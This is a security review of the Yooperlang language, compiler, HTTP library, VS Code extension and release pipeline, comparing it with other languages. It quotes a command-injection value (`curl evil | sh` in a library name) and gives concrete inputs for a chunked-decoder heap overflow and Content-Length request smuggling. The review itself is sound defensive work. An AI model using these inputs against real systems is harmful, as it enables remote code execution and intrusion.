# Security findings: where Yooperlang stands today

A rundown, not a plan. This document says what the language, its runtime, its
standard library and its toolchain do and do not protect against, as of the
tree at commit 477b335, and what other systems languages in the same design
space do about the same problems. It deliberately proposes no work items; that
is a separate conversation. Every claim cites the file and line it rests on so
it can be checked, and the headline items were re-read at source by hand rather
than taken from a summary.

It is written for an engineer coming from .NET and Node, so it spends words on
what those runtimes were quietly doing for you that this language does not.

The short version is in section 1. Sections 3 through 11 are the detail, one
theme each, and each theme ends with what other languages do. Section 12 is
what is done well. Section 13 is the severity list.

---

## 1. The one-paragraph answer

The thing that blocks Yooperlang from being taken seriously as a systems
language from a security standpoint is not any single bug. It is that the
language currently offers C's safety model with a nicer syntax: no bounds
checks, no lifetime checking, no definite-initialization checking, an `unsafe`
gate that does not cover the unsafe operations, and a concurrency model with no
sharing rules. On top of that sit two things a security reviewer would stop at
before reading any code. First, the compiler builds its link command as a shell
string and runs it through `system()`, and one part of that string comes
verbatim from the source file being compiled, so compiling an untrusted `.yoop`
file runs commands as you. Second, every build starts from a binary downloaded
by tag name with no hash or signature pinned in the repository, and the
self-hosting fixpoint that guards releases proves determinism, not trust.

Everything else in this document is real, and some of it is severe (a remote
heap overflow in the HTTP chunked decoder, for example), but those are bugs in
programs written in the language. The items above are properties of the
language and toolchain themselves, and they are what a "memory safe" or
"secure by default" claim would have to answer for.

---

## 2. A translation layer for a .NET / Node engineer

Both of your daily runtimes make a set of promises so consistently that it is
easy to forget they are promises. Yooperlang, like C, makes none of them.

- **Out-of-bounds access.** In C#, `arr[i]` past the end throws
  `IndexOutOfRangeException`. In Node, `buf[i]` past the end returns
  `undefined` and `buf.readUInt8(i)` throws `RangeError`. In Yoop, `xs[i]`
  past the end reads or writes whatever memory happens to sit there. If it is
  another object, that object is now corrupted. If it is unmapped, the process
  dies. If it is a return address, an attacker who controls `i` and the bytes
  written controls the program.
- **Use after free.** The garbage collector makes this impossible for you to
  write in C# or JS: as long as anything can reach an object, it is alive. In
  Yoop, memory is freed when a scope ends or when `dispose` is called, and a
  pointer to it that survives is a live bug that compiles clean.
- **Uninitialized memory.** `int x;` in C# is a compile error if you read `x`
  before assigning it (definite assignment). `let x;` in JS is `undefined`. In
  Yoop, `let x: int32;` is a stack slot containing whatever the previous
  function left there.
- **Integer overflow.** C# wraps silently by default too, which surprises
  people, but it has a `checked` context and `Math.Checked*` helpers. JS
  numbers are doubles and `BigInt` is exact. Yoop wraps silently everywhere,
  and the length arithmetic that guards a buffer is done in the same wrapping
  integers.
- **"Undefined behavior" (UB).** This term has no analog in managed runtimes
  and matters enormously here. When the C/LLVM specification says an operation
  is undefined (dividing by zero, shifting by more than the bit width, reading
  past an array), the optimizer is allowed to assume it never happens and to
  delete or rearrange any code that would only matter if it did. So UB is not
  "a crash"; it is "the compiler may silently remove your safety check because
  the check could only fail via UB". Several Yoop constructs lower to LLVM
  operations that are UB on bad input.
- **A `string`.** In C# and JS a string knows its own length and can contain
  any character, including `\0`. In Yoop a `string` is a bare `char*`: its
  length is a `strlen` call, and a `\0` byte anywhere inside it silently ends
  it. `"/admin\0.txt"` is `"/admin"`.
- **Threads.** C# has no compile-time thread-safety checking either, but a
  data race in C# corrupts logic, not memory (the GC and the type system keep
  objects intact). A data race in Yoop can free memory another thread is still
  writing.
- **Shelling out.** Node's `child_process.exec(cmd)` runs a shell and is the
  well-known injection footgun; `execFile(bin, [args])` does not. The Yoop
  compiler uses the `exec` shape.
- **Dependency integrity.** `package-lock.json` pins every download to a
  sha512 `integrity` hash. The Yoop seed is pinned to a tag name only.

---

## 3. No bounds checks on arrays, slices or vectors

**What.** Every array is a fat pointer `{ data, len }`, so the length is right
there, but no index or slice operation consults it. The single function that
computes an element address reads field 0 and never field 1
([bootstrap/src/codegen/array.yoop:92](../bootstrap/src/codegen/array.yoop#L92)).
The emitter says so: "No bounds check - the language does not specify one yet"
([bootstrap/src/codegen/instr_mem.yoop:68](../bootstrap/src/codegen/instr_mem.yoop#L68)).
Slicing `xs[i..j]` and `arraySlice` compute `len = end - start` with a bare
`sub`, so `end < start` produces a view with a length near 2^64
([bootstrap/src/codegen/array.yoop:159](../bootstrap/src/codegen/array.yoop#L159),
[bootstrap/src/codegen/intrinsic.yoop:283-287](../bootstrap/src/codegen/intrinsic.yoop#L283-L287)).
`Vec` inherits it: `vecGet` is `return v.data[i];`, and because `data` is
sized to `cap` rather than `len`, an index in `[len, cap)` reads uninitialized
heap without even faulting
([std/core/vec.yoop:79-89](../std/core/vec.yoop#L79-L89)). The comment there
says an out-of-range index "traps"; nothing traps.

**Why it matters.** The address is emitted as `getelementptr inbounds`, which
in LLVM terms makes an out-of-range index poison, not merely a wild access: the
optimizer is licensed to assume it did not happen. Every check written in Yoop
against attacker-controlled bytes is load-bearing, because the language
provides no second line.

**The worked example.** The HTTP chunked-body decoder accepts a chunk size of
up to 16 hex digits, which is the entire 64-bit range
([std/http/wire.yoop:235](../std/http/wire.yoop#L235),
[wire.yoop:299-309](../std/http/wire.yoop#L299-L309)). Its three guards are
`r.decoded + size > maxDecoded`, `dataAt + size + 2 > buf.len`, and a CRLF
check at `buf[dataAt + size]`
([wire.yoop:393-410](../std/http/wire.yoop#L393-L410)). With a first chunk of
10 bytes and a second chunk size of `fffffffffffffff7` (2^64 - 9), all three
additions wrap: the total is `1`, the length check passes, and the CRLF check
reads inside the previous chunk's data, which the attacker wrote. `bytesSlice`
then hands back a view of length 2^64 - 9, and `vecExtendFrom` computes
`needed = v.len + src.len`, which also wraps to less than `cap`, so it skips
the realloc and enters a loop writing `v.data[v.len + j] = src[j]`
([std/core/vec.yoop:110-131](../std/core/vec.yoop#L110-L131)). That is a
remote heap overflow with attacker-controlled bytes, reachable on the server
([std/http/server.yoop:237](../std/http/server.yoop#L237)) and on the client
([std/http/client.yoop:398](../std/http/client.yoop#L398)). The rest of the
HTTP parser is careful (section 11), which is what makes this instructive:
one arithmetic slip is enough when the language has no floor under it.

**What others do.**

- **Rust** bounds-checks every index and slice and panics on failure; the
  checks are elided by the optimizer when it can prove the index is in range,
  and iterators avoid them by construction. `get_unchecked` exists but is
  `unsafe`.
- **Zig** bounds-checks in `Debug` and `ReleaseSafe` modes and panics with a
  message; `ReleaseFast` removes the checks. The default for a shipped binary
  is a project decision, and the language makes the safe mode the one you get
  without asking.
- **Odin** (the closest cousin here: ambient allocator context, `defer`,
  no GC) bounds-checks by default and offers `#no_bounds_check` per scope.
- **Go** bounds-checks and panics; the runtime's panic is recoverable but the
  memory is never touched.
- **Swift** traps on out-of-bounds. **Hare** and **C3** bounds-check by
  default. **Ada/SPARK** raise `Constraint_Error`.
- **C and C++** do not, and `-D_FORTIFY_SOURCE` plus ASan are the bolted-on
  answers. Yoop is currently in this column.

---

## 4. Integer arithmetic: silent wrap, and UB on division and shifts

**What.** `add`, `sub`, `mul` are emitted with no `nsw`/`nuw` flags, so
signed and unsigned overflow both wrap two's-complement
([bootstrap/src/codegen/vocab.yoop:40-62](../bootstrap/src/codegen/vocab.yoop#L40-L62)).
That is actually safer than C, where signed overflow is UB. But division and
modulo by zero are emitted as bare `sdiv`/`udiv`, which is UB in LLVM (SIGFPE
on x86 in practice, but the optimizer may assume it cannot happen), and shifts
by >= the bit width are bare `shl`/`lshr`/`ashr`, which produce poison. The
only division-by-zero diagnostic is the compile-time constant folder
([bootstrap/src/comptime/arith.yoop:89-94](../bootstrap/src/comptime/arith.yoop#L89-L94)).
Narrowing casts truncate silently (`narrow(300)=44` in a fixture), `usize(-1)`
is 2^64 - 1, and float-to-int out of range is `fptosi` poison; the emitter
documents that arm64 saturates and x86 does not and tells you not to write a
fixture that depends on it
([bootstrap/src/codegen/vocab.yoop:145-149](../bootstrap/src/codegen/vocab.yoop#L145-L149)).
`heapAlloc<T>(n)` multiplies `n * sizeof(T)` unchecked before calling `malloc`
([bootstrap/src/codegen/intrinsic.yoop:185-203](../bootstrap/src/codegen/intrinsic.yoop#L185-L203)),
and a null return is dereferenced with no check
([docs/writing_yoop.md:604](../docs/writing_yoop.md#L604)).

The std number parser inherits this: `bytesParseInt` wraps in `int64` and its
own comment says defense "is the caller's responsibility today"
([std/core/bytes.yoop:213-214](../std/core/bytes.yoop#L213-L214)). The one
caller that does not defend is `Content-Length`
([std/http/wire.yoop:421](../std/http/wire.yoop#L421)): `18446744073709551621`
wraps to `5`, the server frames a 5-byte body, and any RFC-compliant proxy in
front of it frames the message differently. That is the request-smuggling
primitive.

**Why it matters.** Length and size arithmetic is exactly where overflow turns
into memory corruption (section 3). A language with no bounds checks and no
overflow detection has both halves of the classic exploit chain available.

**What others do.**

- **Rust** panics on overflow in debug builds, wraps in release, and provides
  `checked_*`, `wrapping_*`, `saturating_*` and `overflowing_*` so the intent
  is spelled out. Division by zero always panics. Shift overflow panics in
  debug.
- **Zig** treats overflow as a safety-checked UB: it panics in `Debug` and
  `ReleaseSafe`, and provides `+%` (wrapping), `+|` (saturating) and
  `@addWithOverflow` for when you mean it. Division by zero is checked in
  safe modes.
- **Swift** traps on overflow by default and has `&+` for wrapping.
- **Go** wraps silently, like Yoop, but panics on integer division by zero.
- **C#** wraps by default with an opt-in `checked` context, which is the
  weakest of the managed answers and is still stronger than nothing.
- **Odin** wraps by default; division by zero is not checked.

---

## 5. Ownership is advisory: use-after-free compiles clean

**What.** The kind system's ownership half is documentation. `propagates<K>`
on a type does not force anything, and "there is no unsatisfied-obligation
error and no return-site `propagates<K>` enforcement"
([docs/compiler_internals.md:363-366](../docs/compiler_internals.md#L363-L366)).
The one analysis that runs, `discharge.yoop`, exists to avoid emitting a
second `dispose` when the user already called it by hand, i.e. to avoid a
double free
([bootstrap/src/typecheck/discharge.yoop:10-14](../bootstrap/src/typecheck/discharge.yoop#L10-L14)).
There is no use-after-dispose detection and no move analysis. The project's
own guide names the consequence as "the most likely mistake to make": a
`disposable` binding that is returned is disposed at scope end and the caller
receives freed storage, with no diagnostic
([docs/writing_yoop.md:324-336](../docs/writing_yoop.md#L324-L336),
[docs/writing_yoop.md:597-599](../docs/writing_yoop.md#L597-L599)).

`ref` has one check: a function may not *declare* a `ref` return
([bootstrap/src/typecheck/pass_c.yoop:783-796](../bootstrap/src/typecheck/pass_c.yoop#L783-L796)).
But `ref` is a first-class type that can live in a struct field, an array, a
`Vec`, or a variant payload
([examples/pass/ref_in_struct_field.yoop](../examples/pass/ref_in_struct_field.yoop)),
so returning `{ p: ref localVar }` returns a dangling pointer. The only escape
analysis in the compiler is the opt-in `mustNotEscape scope` clause, and it
fires only when the returned or aliased expression is a bare identifier
([bootstrap/src/typecheck/kind_use.yoop:343-347](../bootstrap/src/typecheck/kind_use.yoop#L343-L347)).
`Dispatcher.from(ref h)` stores a pointer to the handler with no lifetime tie
([std/http/server.yoop:114-117](../std/http/server.yoop#L114-L117));
`vecAsArray` returns a view its own doc says dangles after the next push
([std/core/vec.yoop:99](../std/core/vec.yoop#L99)); `req.body` is a view into
the connection buffer that a handler must not keep
([std/http/types.yoop:392-394](../std/http/types.yoop#L392-L394)).

Two runtime-side lifetime bugs found in the C code belong here too, because
they are the same class:

- `yoop_handle_signal_done` releases the handle mutex and then keeps reading
  the handle, while the waiter that just woke immediately destroys and frees
  that mutex via `yoop_task_free_sync_pair`
  ([runtime/yoop_runtime.c:791-807](../runtime/yoop_runtime.c#L791-L807),
  [runtime/yoop_runtime.c:839](../runtime/yoop_runtime.c#L839)). For a stack
  handle the frame can be gone by the time the signaller's last read runs.
- `run_task_step` reads the task's allocator-context slot after settling has
  already released waiters; the source documents this as a KNOWN RACE that
  ends in `free()` of a pointer that was never allocated, reproducing about
  4 runs in 50 with more than 8 workers
  ([runtime/yoop_runtime.c:229-242](../runtime/yoop_runtime.c#L229-L242)).
  Free of an arbitrary pointer is an exploitation primitive, not just a crash.

**Why it matters.** Use-after-free is the single most exploited bug class in
C and C++ codebases (roughly the same share as out-of-bounds in Microsoft's
and Chromium's published breakdowns). A language whose ownership rules are
comments has not addressed it.

**What others do.**

- **Rust** is the reference answer: ownership and borrowing are checked at
  compile time, a reference cannot outlive what it points at, and moving a
  value out invalidates the old name. Returning a reference to a local is a
  compile error; so is storing one in a struct that outlives it, because the
  struct's lifetime parameter says so.
- **Swift** uses automatic reference counting plus exclusivity enforcement
  (two overlapping mutable accesses to the same variable are a compile or
  runtime error) and, since 5.9, `~Copyable` types for move-only ownership.
- **Zig** and **Odin** do not check lifetimes either. Their answer is cultural
  and structural: `defer`/`errdefer` put cleanup next to acquisition, the
  allocator is an explicit parameter (Zig) or context (Odin) so ownership is
  visible, and `std.testing.allocator` in Zig fails a test on any leak or
  double free. Zig's `GeneralPurposeAllocator` detects double free and
  use-after-free in safe modes by quarantining freed memory. Neither claims to
  be memory safe, and neither ships an HTTP server that a new user would put
  on a port as their first program. Yoop is in this camp but with a syntax
  (`disposable`, `propagates`) that reads as if it were in Rust's.
- **Vale**, **Austral**, and **Hylo** are research-grade languages exploring
  linear or generational ownership as a lighter alternative to borrow
  checking; Austral's linear types in particular are close in spirit to what
  a `disposable` kind is gesturing at, but enforced.
- **Go**, **C#**, **Java**: garbage collection. Not an option for a language
  whose pitch is no GC, but worth naming as the reason the problem never
  came up in your day job.

---

## 6. Uninitialized locals and unreachable switch arms

**What.** The spec says `let x: int32;` is zero-initialized
([SPEC.md:334](../SPEC.md#L334)). The compiler emits an `alloca` and no
store; the comment defers to a typecheck pass
([bootstrap/src/codegen/stmt.yoop:217-218](../bootstrap/src/codegen/stmt.yoop#L217-L218)),
and no definite-assignment analysis exists in `bootstrap/src/typecheck/`.
Module-level globals *are* `zeroinitializer`. So a local declared without an
initializer holds stack garbage, and if its type is `string`, `.len` on it is
`strlen(garbage)`; if it is a variant, its tag is garbage.

An exhaustive `switch` over an enum or variant synthesizes a default arm that
is LLVM `unreachable`
([bootstrap/src/codegen/switch.yoop:77-88](../bootstrap/src/codegen/switch.yoop#L77-L88)).
Reaching it is full UB. Three routes get there: an uninitialized variant, a
value returned from `extern "C"` with an out-of-range tag, or a `union` field
read at an enum type.

**What others do.** Rust, Swift, Zig, Go, C# and Java all refuse or define
reads of uninitialized locals (compile error, forced zero, or `undefined` as a
checked sentinel in Zig). Rust's `match` is exhaustive and an out-of-range
discriminant is impossible to construct outside `unsafe`; Swift's `switch`
likewise. C leaves locals uninitialized, and `-ftrivial-auto-var-init=zero`
exists precisely because that was a recurring vulnerability source.

---

## 7. The `unsafe` gate does not gate the unsafe operations

**What.** `import.unsafe;` is consulted in exactly four places: the
`unsafe_ptr` type annotation, the four `unsafe_ptr.*` intrinsics, `&x`, and
`*p`
([bootstrap/src/typecheck/resolve.yoop:81-85](../bootstrap/src/typecheck/resolve.yoop#L81-L85),
[unsafe_ptr_ops.yoop:29-34](../bootstrap/src/typecheck/unsafe_ptr_ops.yoop#L29-L34),
[check_access.yoop:434-438](../bootstrap/src/typecheck/check_access.yoop#L434-L438),
[check_access.yoop:464-468](../bootstrap/src/typecheck/check_access.yoop#L464-L468)).
Everything else that grants raw memory access is available to any file:

- `extern "C" { ... }` is ungated. Any file may declare `free(p: usize)` or
  `memcpy` with whatever signature it likes and call it. Dozens of fixtures
  declare `printf` this way with no `import.unsafe;`.
- `extern "intrinsic"` is ungated, and codegen dispatches intrinsics by name
  string, so a user file can declare `heapAlloc` or `bytesAsStringUnchecked`
  itself
  ([bootstrap/src/typecheck/pass_a.yoop:166-173](../bootstrap/src/typecheck/pass_a.yoop#L166-L173),
  [bootstrap/src/codegen/intrinsic.yoop:73-100](../bootstrap/src/codegen/intrinsic.yoop#L73-L100)).
- `heapAlloc`/`heapFree`/`ctxAlloc`/`ctxFree`, `stringAsBytes`,
  `stringFromBytesUnchecked`, `bytesAsStringUnchecked` (which drops the length
  and trusts a NUL the caller promised), and `arraySlice` are all ungated by
  design ([std/core/intrinsics.yoop](../std/core/intrinsics.yoop)).
- `union` is untagged and ungated: every field lives at the same address and a
  field read reinterprets the bytes at the field's type
  ([bootstrap/src/codegen/union.yoop:9-16](../bootstrap/src/codegen/union.yoop#L9-L16),
  [bootstrap/src/typecheck/unions.yoop:4](../bootstrap/src/typecheck/unions.yoop#L4)).
  That is arbitrary type punning, including integer-to-pointer, in a plain
  module.
- The gate is per module, not per file: in a directory module one file's
  `import.unsafe;` unlocks raw pointers for every sibling
  ([bootstrap/src/typecheck/pass_a.yoop:51-56](../bootstrap/src/typecheck/pass_a.yoop#L51-L56)),
  which contradicts the "a file using raw pointers says so at the top" intent
  the docs describe.

**Why it matters.** The value of an `unsafe` marker is that a reviewer can
grep for it and know that everything outside it is safe. Here the marker
covers pointer syntax and not the pointer-equivalent operations, so a grep
proves nothing. This is the difference between "has an unsafe keyword" and
"has a safe subset".

**What others do.**

- **Rust**: every FFI call, raw pointer dereference, union field read,
  `transmute`, and `get_unchecked` requires an `unsafe` block, and the
  standard library's soundness story is that safe code cannot cause UB no
  matter what it does. Clippy and Miri build on that boundary.
- **C#**: pointer types and `fixed` need an `unsafe` block and the
  `/unsafe` compiler switch; `DllImport` does not, which is the same gap Yoop
  has with `extern "C"`, and it is a recognized weakness of the C# model.
- **Zig** and **Odin** have no safe subset at all and do not claim one;
  everything is "unsafe" in the Rust sense, and the languages are honest about
  that. Yoop's design sits uncomfortably in between: it has the keyword and
  not the property.
- **Swift**: `Unsafe*Pointer` types are named as such and bounds-checking is
  off only for them; C interop goes through those types, so the marker is in
  the type name rather than a block.

---

## 8. Concurrency: no sharing rules, and the spec says there are

**What.** `SPEC.md:719-720` says `mustNotShare acrossThreads` is "Statically
rejected at every task-call argument site." It is not implemented. The only
non-lexer references are a comment in the kind validator listing it among
words the compiler "RECORDS but does not yet act on"
([bootstrap/src/typecheck/kinds.yoop:129-131](../bootstrap/src/typecheck/kinds.yoop#L129-L131)),
and the fail fixture that would prove the rule,
`examples/fail/kind_mustnotshare_acrossthreads.yoop`, has no
`.expected-errors`, so the diagnostic suite never asserts it. What a task
binding actually checks is: the right-hand side is a fresh call unless the
binding is `pooled`, `main` is not a task, a task does not return `void`, and
`wait` is not used inside a task body
([bootstrap/src/typecheck/check_stmt.yoop:274-286](../bootstrap/src/typecheck/check_stmt.yoop#L274-L286),
[bootstrap/src/typecheck/task.yoop:196-279](../bootstrap/src/typecheck/task.yoop#L196-L279)).
Nothing examines the arguments for shareability.

Consequences:

- Module-level `let` globals are ordinary writable statics shared by every
  worker thread ([examples/pass/module_level_mutable_array.yoop](../examples/pass/module_level_mutable_array.yoop)).
- A `ref T` argument to a task function is a pointer copied into the task
  handle by value
  ([bootstrap/src/codegen/task_spawn.yoop:99-123](../bootstrap/src/codegen/task_spawn.yoop#L99-L123)).
  For a `pooled` handle, which is heap allocated and may outlive the spawning
  frame, the task dereferences a pointer into a dead stack.
- A task body that crashes leaves its handle unfinished forever and anything
  waiting on it blocks forever; "there is no crashed state"
  ([docs/compiler_internals.md:274-276](../docs/compiler_internals.md#L274-L276)).
  For a server that is a denial of service triggered by any bug.
- The ambient allocator context is thread-local state that is swapped per
  task step; the docs say the static claim "you are in an arena" would be a
  lie across an `await`
  ([docs/writing_yoop.md:311-313](../docs/writing_yoop.md#L311-L313)), and the
  runtime race described in section 5 is the place that swap goes wrong.
- `yoop_cancel_link` reads and writes `child->parent` under the parent's lock
  while `yoop_cancel_release` reads and clears it under none
  ([runtime/yoop_cancel.c:118-123](../runtime/yoop_cancel.c#L118-L123),
  [runtime/yoop_cancel.c:226-231](../runtime/yoop_cancel.c#L226-L231)).

**Why it matters.** A data race in a memory-unsafe language is a memory-safety
bug, not a logic bug. And a spec that describes a check which does not exist
is worse than no spec, because a reader designing against it will believe the
compiler has their back.

**What others do.**

- **Rust**: `Send` and `Sync` are auto traits inferred from a type's fields;
  a value that is not `Send` cannot cross a thread boundary, and this is
  checked at every spawn. This is the mechanism `mustNotShare acrossThreads`
  is describing. Rust's aliasing rule (one mutable reference or many shared
  ones) is what makes data races impossible in safe code.
- **Go**: memory safe under races (the GC keeps objects alive), but races on
  multiword values can still tear; the answer is `go test -race`, a runtime
  race detector built on ThreadSanitizer, plus the culture of channels.
- **Swift 6**: strict concurrency checking makes crossing an isolation
  boundary with a non-`Sendable` value a compile error; actors serialize
  access to their state.
- **Zig** and **Odin**: no compile-time story; thread safety is the
  programmer's job, and both say so.
- **C#**: no compile-time story, but the runtime guarantees a race cannot
  corrupt the heap.

---

## 9. Strings are `char*`, and that leaks into every parser

**What.** A `string` is a NUL-terminated pointer; `.len` is `strlen`
([bootstrap/src/codegen/array.yoop:165-181](../bootstrap/src/codegen/array.yoop#L165-L181)).
`stringAsBytes` measures with `strlen`, so a byte buffer that contained a NUL
round-trips through `string` with everything after the NUL gone, silently.
Every parsed HTTP field goes through `stringFromBytesUnchecked`
([std/http/wire.yoop:107-109](../std/http/wire.yoop#L107-L109),
[std/http/url.yoop:26](../std/http/url.yoop#L26)), so `/admin%00.txt`
percent-decodes to bytes containing `0x00` and the router sees `/admin`. The
raw bytes say one thing, the `string` says another, and every filter-then-use
split downstream is exploitable in the usual way.

UTF-8 validity is relied on by the char iterators but not enforced: the
validating constructor `stringFromBytes` checks sequence shape only and
accepts 3-byte overlongs (`E0 80 AF`, an overlong `/`), UTF-16 surrogates
(`ED A0 80`), and codepoints above U+10FFFF
([std/core/strings.yoop:29-61](../std/core/strings.yoop#L29-L61)). Overlong
slash encodings are the canonical path-filter bypass.

`printf` is globally callable. The compiler correctly rewrites
`printf(runtimeString)` into `printf("%s", runtimeString)`, and the emitter
documents the stack-address leak that motivated it
([bootstrap/src/codegen/printf_format.yoop:51-72](../bootstrap/src/codegen/printf_format.yoop#L51-L72)).
The guard bails when there are varargs, so `printf(runtimeFmt, x, y)` still
hands an attacker-influenced format, `%n` included, to libc.

Also in this class: the string-building API (`stringConcat`, template
literals, `intToString`) mallocs and nothing frees, so a long-running HTTP
server's memory grows with every header it has ever seen
([std/http/server.yoop:53-63](../std/http/server.yoop#L53-L63)). That is
remote memory exhaustion with well-formed traffic.

**What others do.** Rust's `str` is a length-carrying slice guaranteed to be
valid UTF-8 (`from_utf8` rejects overlongs and surrogates); `CStr` is the
separate, explicitly named NUL-terminated type for FFI, and conversion between
them is where you are forced to think. Go strings are length-carrying byte
slices with no validity guarantee but no truncation. Zig uses `[]const u8`
slices everywhere and `[*:0]const u8` as a distinct sentinel-terminated type
for C. Odin has a `string` (ptr + len) and a separate `cstring`. Every one of
these separates "text with a length" from "C string" at the type level, which
is what the spec's open question 3 (`String <-> cstr`) is asking about.

---

## 10. The compiler and editor as an attack surface

This is the section most likely to make a security reviewer stop reading.

**Compiling a hostile file used to run its commands. FIXED.** The link step
built one string and handed it to libc `system()`, with the library name from
`extern "C" from library "NAME"` appended verbatim, so a `.yoop` file
containing `library "m; curl evil | sh"` executed that as the person who
compiled it; the `--test` harness had the same shape with argv filters and a
`$TMPDIR`-derived path. The class of victim was anyone who clones a repo and
runs `yoopiler_boot` on it, any CI job compiling a pull request, and any future
package registry.

What replaced it, in two layers. The compiler now runs clang and the test
binary from an argv array through `yoop_proc_run`
([runtime/yoop_io.c](../runtime/yoop_io.c), `posix_spawnp` on POSIX,
`CreateProcess` with the CRT's own quoting rules on Windows, no shell on
either), built in
[bootstrap/src/link/clang.yoop](../bootstrap/src/link/clang.yoop) and
[bootstrap/src/test_mode/run.yoop](../bootstrap/src/test_mode/run.yoop) as a
`Vec<string>`; a library name is one `-lNAME` element whatever it contains.
And the name is checked at its declaration
([bootstrap/src/typecheck/link_names.yoop](../bootstrap/src/typecheck/link_names.yoop)):
letters, digits, `_`, `.`, `+`, `-`, not beginning with `-`, which closes the
one thing an argv array cannot (a leading `-` is a linker flag in any slot).
Proof: [runtime/tests/proc_run.c](../runtime/tests/proc_run.c) shows
metacharacters arriving in the child byte for byte,
[bootstrap/src/link/link.test.yoop](../bootstrap/src/link/link.test.yoop)
asserts the argv shape, and
[examples/fail/extern_library_bad_name.yoop](../examples/fail/extern_library_bad_name.yoop)
is refused at the block. The Node-side scripts already used `execFileSync`.

**Opening a folder in VS Code runs a binary from that folder.** The extension
walks up from the opened folder looking for three marker paths and, when it
finds them, spawns `build/dev/bin/yoopiler_boot` from that checkout as the
language server, falling back to any file named `yoopiler_boot` under `.seed/`
([editors/vscode/extension.js:108-124](../editors/vscode/extension.js#L108-L124),
[extension.js:189-200](../editors/vscode/extension.js#L189-L200),
[extension.js:345-351](../editors/vscode/extension.js#L345-L351)). A repo
that ships three empty marker paths plus that binary executes on folder open.
The extension declares no Workspace Trust restriction in its `package.json`,
so VS Code does not step in.

**The language server runs compile-time evaluation on whatever is open.** The
LSP calls `runPrecompilePass` on every analysis
([bootstrap/src/lsp/diagnose.yoop:156](../bootstrap/src/lsp/diagnose.yoop#L156)).
The comptime evaluator has a strict extern allow-list (fourteen pure
functions, no I/O, checked before arguments are evaluated), which is done
right. But it has a recursion cap and no step or time budget; the source says
it is "a RUNAWAY guard and not a budget"
([bootstrap/src/comptime/context.yoop:21-37](../bootstrap/src/comptime/context.yoop#L21-L37)),
so a `while (true)` in a `@precompile` block wedges the editor.

**Import paths escape every root.** `std/`, `modules/` and relative imports
are joined and normalized with no containment check, and absolute paths are
allowed
([bootstrap/src/source_graph/resolve.yoop:24-56](../bootstrap/src/source_graph/resolve.yoop#L24-L56)).
Since there is no `@embed` and comptime cannot read files, the blast radius is
"a diagnostic quotes part of a file it should not have read", which matters
where compiler output is shown to strangers (CI logs, a web playground).

**The `--plugin` flag is `sh -c`.** `yoop_plugin_spawn` passes its string to
`yoop_proc_spawn`, which is `execl("/bin/sh", "sh", "-c", cmdline)`
([runtime/yoop_io.c:931](../runtime/yoop_io.c#L931)). That is fine as a
trust decision (a plugin path is as trusted as the compiler), but
`docs/plugins.md` does not say so, and the `yoop_proc_spawn` symbol, with its
unlocked global slot table, is linked into every compiled program whether or
not it uses plugins.

**What others do.**

- **Rust's `cargo`** and **Go's `go`** invoke the linker with argv arrays,
  never a shell. `#[link(name = "...")]` in Rust is validated and passed as a
  separate argument. Both treat "compiling untrusted code" as a serious threat
  model precisely because `build.rs` and `go generate` exist; Go's toolchain
  has had CVEs (`-fsanitize` via cgo flags, for one) for exactly this shape,
  and now allow-lists the flags cgo may forward.
- **VS Code Workspace Trust** exists for this problem. rust-analyzer will not
  run `build.rs` or proc-macros in an untrusted workspace; the Go and C#
  extensions declare `untrustedWorkspaces` capabilities. An extension that
  spawns a workspace-provided binary is the textbook case the mechanism was
  built to stop.
- **Zig** runs `build.zig` as compiled Zig code, which is arbitrary code
  execution by design, and the project says so plainly; the mitigation being
  discussed upstream is sandboxing the build runner. Yoop's comptime is
  actually stricter than this (an allow-list), which is worth keeping.

---

## 11. Supply chain: the seed, releases, and hardening

**The seed.** Every build starts from a previously released `yoopiler_boot`
fetched by `gh release download <SEED_TAG>` and extracted
([scripts/seed.mjs:120-139](../scripts/seed.mjs#L120-L139)). `SEED_TAG` is
a tag string ([seed.mjs:37](../scripts/seed.mjs#L37)); there is no sha256
constant, no signature, no attestation check anywhere in the file. A
`.sha256` is produced on the publish side and uploaded beside the tarball,
but nothing downloads or compares it, and a hash fetched from the same
release as the artifact proves nothing anyway. GitHub tags are movable and
assets are replaceable, so the pin is a name, not bytes. `YOOP_SEED` is
honored first and unverified, and `setup.mjs` accepts any file named
`yoopiler_boot` under `.seed/`.

**Trusting trust.** The three-stage fixpoint compares stage2 to stage3 byte
for byte in both IR and binary and refuses to package on a mismatch
([scripts/package_bootstrap.mjs](../scripts/package_bootstrap.mjs),
[src/selfhost.test.js:108-120](../src/selfhost.test.js#L108-L120)). That is
a genuine determinism proof and a good release gate. It is not a trust proof:
stage2 and stage3 are both descendants of the seed, so a self-reproducing
backdoor in the seed (Ken Thompson's 1984 "Reflections on Trusting Trust")
survives the fixpoint by construction. The JS reference compiler that would
have been the independent second root was deleted
([seed.mjs:5-8](../scripts/seed.mjs#L5-L8)); the trade is stated honestly in
that file, but there is currently no path from source to binary that does not
pass through an unverified download.

**Releases.** Linux is built in CI; macOS and Windows archives are built on
personal machines and uploaded with a personal `gh` credential
([scripts/release_platform.mjs](../scripts/release_platform.mjs)). There is
no signing, no provenance attestation, and `--clobber` can replace an asset
others have already seeded from. GitHub Actions are pinned by floating tag
(`actions/checkout@v4`), not commit SHA
([.github/workflows/ci.yml:45-47](../.github/workflows/ci.yml#L45-L47)). On
the positive side: `permissions: contents: read` at the top, `write` only on
the tag-gated release job, no long-lived secrets, no `pull_request_target`,
and zero npm dependencies in the root package.

**Binary hardening.** The complete user-program link line is
`clang -g -Wno-override-module -o "<out>" "<ir>"` plus runtime sources and
`-lpthread`/`-lm` ([bootstrap/src/link/clang.yoop:126-164](../bootstrap/src/link/clang.yoop#L126-L164)).
No `-O` flag (so `-O0`), no `-fstack-protector-strong`, no explicit `-fPIE`
or `-pie`, no `-Wl,-z,relro,-z,now`, no `-z noexecstack`, no
`-fcf-protection`, no sanitizer plumbing, and the emitted IR carries no
function attributes. `_FORTIFY_SOURCE` would be inert anyway because codegen
calls libc directly from IR without headers. There is no debug/release
distinction in the CLI. Combined with sections 3 and 5, a shipped Yoop binary
is an unoptimized, unprotected C program: stack smashing is not detected,
and whether it is even position-independent depends on the distro's clang
defaults.

**What others do.**

- **Reproducible and diverse bootstraps.** David A. Wheeler's Diverse
  Double-Compiling (2009) is the formal answer to Thompson: compile the
  compiler's source with two unrelated compilers and check that the results
  converge. **GNU Guix** and **Bootstrappable Builds** drive this to the
  extreme with a bootstrap chain starting from a few hundred bytes of
  auditable machine code. **Rust** keeps its bootstrap compiler pinned by
  exact hash in `src/stage0` and publishes signed release manifests; **Go**
  is bootstrappable from a C compiler or an older Go, and `go.sum` pins every
  module by hash with a transparency log (`sum.golang.org`) behind it.
